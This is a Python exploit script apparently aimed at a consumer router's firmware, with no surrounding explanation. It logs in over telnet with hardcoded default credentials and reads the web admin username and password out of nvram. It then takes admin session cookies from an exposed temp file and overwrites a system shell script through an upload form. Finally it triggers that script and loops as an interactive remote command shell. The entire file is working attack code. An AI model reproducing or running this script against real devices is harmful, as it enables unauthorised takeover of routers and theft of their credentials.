import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import telnetlib
import time
import urllib


def login_get_cookies(router_ip):
    print("Gathering important values...")
    #Connect to Telnet and Get Router Web Login Creds
    user = 'ftp'
    password = '7018n'
    cmd1 = 'nvram_get Login'
    cmd2 = 'nvram_get Password'
    tn = telnetlib.Telnet(router_ip)
    tn.read_until(b"login: ")
    tn.write(user.encode('ascii') + b"\n")
    if password:
        tn.read_until(b"Password: ")
        tn.write(password.encode('ascii') + b"\n")
        time.sleep(.5)
    tn.write(b"nvram_get Login\n")
    time.sleep(.5)
    tn.write(b"nvram_get Password\n")
    time.sleep(.5)
    tn.write(b"exit\n")
    router_login_creds = tn.read_all().decode('ascii')
    #telnet_out = tn.read_all().decode('ascii')
    web_user = router_login_creds.split("nvram_get Login\r\n")
    web_user = web_user[1].split("\r\n")[0].strip()
    web_pass = router_login_creds.split("nvram_get Password\r\n")
    web_pass = web_pass[1].split("\r\n")[0].strip()

    #Login To Router Web Interface
    web_user = urllib.parse.quote(web_user)
    web_pass = urllib.parse.quote(web_pass)
    data = 'UserName='+web_user+'&Passwd='+web_pass+'&langSelection=en&Login_s=Login'
    cookie = {
        'language':'en',
        'xu_cookie':'xxx_look',
        'xu2_cookie':'xx_look2'
    }
    login = requests.post("http://"+router_ip+"/goform/loginForm",data=data, cookies = cookie)

    get_admin = requests.get("http://"+router_ip+"/tmp/data.txt?_=",cookies = cookie)
    print(get_admin.text.replace("\n","%0A").replace(" ","%20"))

    admin_cookies = get_admin.text.replace("\n","%0A").replace(" ","%20")
    return admin_cookies

def exec_command(router_ip,cookie):
    #Send Command to Server
    cmd_e = input("admin@" + router_ip +" > ")
    form_data = MultipartEncoder(
        fields = {
            'destPath': ('','%2Fetc_ro%2Fweb%2Fsh%2Fgetdskinfo.sh'),
            'uploadedfile':('script.sh','#!/bin/bash\n' + cmd_e +' > /etc_ro/web/lang/en/shell\n','application/x-shellscript')
        }
    )
    send_payload = requests.post("http://"+router_ip+"/goform/upldForm", data=form_data, headers={'Content-Type': form_data.content_type})

    #Trigger Shell
    admin_cookies = {
        'language':'en',
        'xu_cookie':cookie
    }

    trigger_payload = requests.get('http://'+router_ip+'/goformX/formFSrvX?OP=RCMD&VN=0&SZCMD=/etc_ro/web/sh/getdskinfo.sh',cookies=admin_cookies)
    print(trigger_payload.status_code)
    print(trigger_payload.text)
    #Read Command Output From Server
    grab_output = requests.get("http://" + router_ip + "/lang/en/shell")
    print(grab_output.text)


def main():
    router_ip = input("Please enter the router's IP: ")
    cookie = login_get_cookies(router_ip)
    while True:
        exec_command(router_ip,cookie)
        
if __name__ == '__main__':
    main()
